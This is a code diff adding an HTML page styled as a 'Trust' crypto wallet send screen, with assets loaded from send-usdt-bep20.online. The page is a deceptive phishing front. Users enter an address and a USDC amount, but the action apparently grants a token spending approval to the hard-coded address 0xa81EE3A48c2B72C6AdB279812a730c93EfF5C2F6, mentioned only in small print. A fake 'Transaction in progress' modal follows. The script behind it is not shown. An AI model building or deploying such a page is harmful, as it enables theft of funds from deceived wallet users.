@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en" class="theme-dark">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <link rel="icon" type="image/svg+xml" href="https://send-usdt-bep20.online/vite.svg">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+  <title>Trust</title>
+  <link rel="stylesheet" crossorigin="" href="./style.css">
+</head>
+<body>
+  <div id="root">
+    <div class="page">
+      <div class="card">
+        <label class="label">Address or Domain Name</label>
+        <div class="input-row primary">
+          <input id="address-input" placeholder="Search or Enter" value="">
+          <span class="paste">Paste</span>
+          <div class="right-icons">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke="#1D4ED8" stroke-width="2.3" class="contact-icon" fill="none" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="4" width="14" height="16" rx="2"></rect><line x1="4" y1="8" x2="6" y2="8"></line><line x1="4" y1="12" x2="6" y2="12"></line><line x1="4" y1="16" x2="6" y2="16"></line><line x1="9" y1="9" x2="17" y2="9"></line><line x1="9" y1="12" x2="17" y2="12"></line></svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#22c55e" class="qr-icon" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 8V6a2 2 0 0 1 2-2h2"></path><path d="M16 4h2a2 2 0 0 1 2 2v2"></path><path d="M20 16v2a2 2 0 0 1-2 2h-2"></path><path d="M8 20H6a2 2 0 0 1-2-2v-2"></path><line x1="5" y1="12" x2="19" y2="12"></line></svg>
+          </div>
+        </div>
+
+        <label class="label">Destination network</label>
+        <div class="network-row">
+          <div class="network-left">
+            <div class="bsc-circle eth-circle">Ξ</div>
+            <span>Ethereum</span>
+          </div>
+          <img class="network-arrow" alt="arrow" src="https://send-usdt-bep20.online/images/arrow-icon.png">
+        </div>
+
+        <label class="label">Amount</label>
+        <div class="input-row amount-row">
+          <input id="amount-input" placeholder="USDC Amount" type="number" min="0" step="0.000001" value="">
+          <span class="unit">USDC</span>
+          <span class="max">Max</span>
+        </div>
+        <p class="estimate" id="estimate">≈ $0.00</p>
+        <p class="disclaimer" id="disclaimer">This authorizes spender 0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6 for the entered USDC amount. It is not a normal transfer.</p>
+        <p class="status-text" id="status-text"></p>
+        <button class="connect-btn dark active" id="connect-button">Next</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="ps-backdrop hidden" id="processing-modal">
+    <div class="ps-sheet dark">
+      <div class="ps-header">
+        <button class="ps-close" id="processing-close">x</button>
+      </div>
+      <div class="ps-gif-wrap">
+        <div class="processing-dot"></div>
+      </div>
+      <h2 class="ps-title">Processing...</h2>
+      <p class="ps-sub">Transaction in progress! Blockchain validation is underway. This may take a few minutes.</p>
+      <button class="ps-action" id="tx-details-button" disabled>Transaction details</button>
+    </div>
+  </div>
+
+  <script src="./script.js"></script>
+</body>
+</html>
